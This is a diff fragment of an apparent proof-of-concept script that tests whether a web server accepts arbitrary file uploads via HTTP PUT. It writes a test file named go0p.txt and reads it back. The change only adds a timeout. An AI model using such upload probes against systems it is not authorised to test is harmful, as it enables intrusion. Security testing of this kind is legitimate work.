@@ -13,7 +13,7 @@ def poc(url):
     url1 = "%s/%s.txt" % (url, 'go0p')
 
     try:
-        req = requests.put(url1, headers=headers, data={'test': file_content})
+        req = requests.put(url1, headers=headers, data={'test': file_content}, timeout=60)
         time.sleep(1.5)
         req_get = requests.get(url1, headers=headers, timeout=5)
         if file_content in str(req_get.text):
